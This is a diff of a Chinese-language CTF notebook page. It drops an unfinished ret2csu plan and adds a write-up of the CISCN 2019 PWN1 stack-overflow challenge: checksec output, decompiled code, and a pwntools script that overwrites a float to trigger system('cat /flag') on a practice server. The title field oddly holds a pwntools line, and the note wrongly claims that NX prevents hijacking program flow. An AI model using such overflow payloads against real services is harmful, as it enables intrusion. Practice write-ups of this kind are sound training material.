@@ -1,31 +1,51 @@
 ﻿---
-title: "pwn"
-lastmod: 2026-03-26T18:13:24+08:00
+title: "context(os=\"linux\", arch=\"amd64\", log_level=\"debug\")"
+lastmod: 2026-06-15T09:08:19+08:00
 draft: false
 ---
-- [P391 [SWPUCTF 2021 新生赛]whitegive_pwn](#p391-swpuctf-2021-%E6%96%B0%E7%94%9F%E8%B5%9Bwhitegive_pwn)
-
----
-
-# P391 [SWPUCTF 2021 新生赛]whitegive_pwn
-给了附件，下载看看
-
-地址看起来是64位的系统
-
-直接反编译一下，发现一个vuln函数存在注入点
-
-shift+F12什么也找不着，这就说明是一个正经的libc偏移
-
-找一个代码写一下就行
-
-```plain
-
+## P100[CISCN 2019华北]PWN1
+下载附件下来看一下
 ```
+Arch:     amd64
+RELRO:      Partial RELRO
+Stack:      No canary found
+NX:         NX enabled
+PIE:        No PIE (0x400000)
+Stripped:   No
+```
+只开了nx
+代表我们不能劫持程序流，只能利用原有的程序
+```c
+int func()
+{
+  _BYTE v1[44]; // [rsp+0h] [rbp-30h] BYREF
+  float v2; // [rsp+2Ch] [rbp-4h]
 
-我只能说正常题目已经跑通了，但是这道题目不正常
+  v2 = 0.0;
+  puts("Let's guess the number.");
+  gets(v1);
+  if ( v2 == 11.28125 )
+    return system("cat /flag");
+  else
+    return puts("Its value should be 11.28125");
+}
+```
+好像不需要劫持程序流，直接写完v1然后写v2就行了
+注意一下不能直接在p32里面写11.28125，需要写对应的16进制的值，不能帮你转换
+![[Pasted image 20260615090615.png]]
+去程序里面找到相应的值，然后替换一下就行
+```python
+from pwn import *
 
-没有rdi pop这个东西，什么鬼东西
+# context(os="linux", arch="amd64", log_level="debug")
 
-所以Stage1 用 ret2csu 泄露 puts@got；Stage2 用 libc 里的 pop rdi  
+io = remote("node4.anna.nssctf.cn", 24219)
 
+# io = process(".\[CISCN 2019华北]PWN1")
 
+payload = b'A' * 44 + p64(0x41348000)
+
+io.sendline(payload)#send不会输出换行符，只能用sendline
+
+io.interactive()
+```
